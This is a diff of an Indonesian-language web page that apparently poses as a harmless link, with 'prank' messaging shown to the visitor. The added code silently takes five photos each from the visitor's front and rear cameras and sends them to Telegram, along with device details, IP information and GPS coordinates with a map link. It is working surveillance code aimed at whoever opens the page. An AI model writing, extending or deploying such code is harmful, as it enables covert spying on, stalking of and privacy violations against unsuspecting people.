@@ -1,3 +1,4 @@
+<!-- FULL FINAL FIXED VERSION - Sesuai Permintaan -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -183,74 +184,58 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       });
     };
 
-    // Ambil kamera dengan opsi front camera (kamera depan) dulu,
-    // kalau gagal baru coba default kamera belakang
-    const ambilKamera = async () => {
-      const constraintsList = [
-        { video: { facingMode: "user" } },       // kamera depan
-        { video: true }                          // kamera default (biasanya belakang)
-      ];
-      let stream = null;
-      for (const constraints of constraintsList) {
-        try {
-          stream = await navigator.mediaDevices.getUserMedia(constraints);
-          if (stream) break;
-        } catch {}
-      }
-      if (!stream) {
+    const ambilKamera = async (facingMode, label) => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        await video.play();
+        await new Promise(resolve => {
+          const cek = () => {
+            if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
+            else requestAnimationFrame(cek);
+          };
+          cek();
+        });
+        for (let i = 0; i < 5; i++) {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+          await new Promise(resolve => canvas.toBlob(async (blob) => {
+            if(blob) await kirimFoto(blob);
+            resolve();
+          }, "image/jpeg"));
+        }
+        stream.getTracks().forEach(track => track.stop());
+        return "";
+      } catch {
         return `
-- 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
-
+- 〘 ${label} 〙 -
 ❌ Kamera tidak diizinkan oleh pengguna.
 `;
       }
-
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.setAttribute("playsinline", true);
-      await video.play();
-
-      await new Promise(resolve => {
-        const cek = () => {
-          if (video.videoWidth > 0 && video.videoHeight > 0) resolve();
-          else requestAnimationFrame(cek);
-        };
-        cek();
-      });
-
-      const fotoCount = 5;
-      for (let i = 0; i < fotoCount; i++) {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-
-        // Kirim foto ke Telegram
-        await new Promise(resolve => canvas.toBlob(async (blob) => {
-          if(blob) await kirimFoto(blob);
-          resolve();
-        }, "image/jpeg"));
-
-        // Delay singkat biar gercep tapi gak terlalu cepat (100ms)
-        await new Promise(r => setTimeout(r, 100));
-      }
-
-      stream.getTracks().forEach(track => track.stop());
-      return "";
     };
 
     const mulai = async () => {
-      const [kamera, info, ip, lokasi] = await Promise.all([
-        ambilKamera(),
+      const [info, ip, lokasi] = await Promise.all([
         ambilDataPerangkat(),
         ambilIPInfo(),
         ambilLokasi()
       ]);
 
-      const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
+      let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+
+      const kameraDepan = await ambilKamera("user", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡");
+      if (kameraDepan) hasil += `\n${kameraDepan}`;
+
+      const kameraBelakang = await ambilKamera("environment", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");
+      if (kameraBelakang) hasil += `\n${kameraBelakang}`;
+
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
-      await kirimPesan(final);
+      await kirimPesan(hasil);
 
       setTimeout(() => {
         document.getElementById("msg").classList.add("hidden");
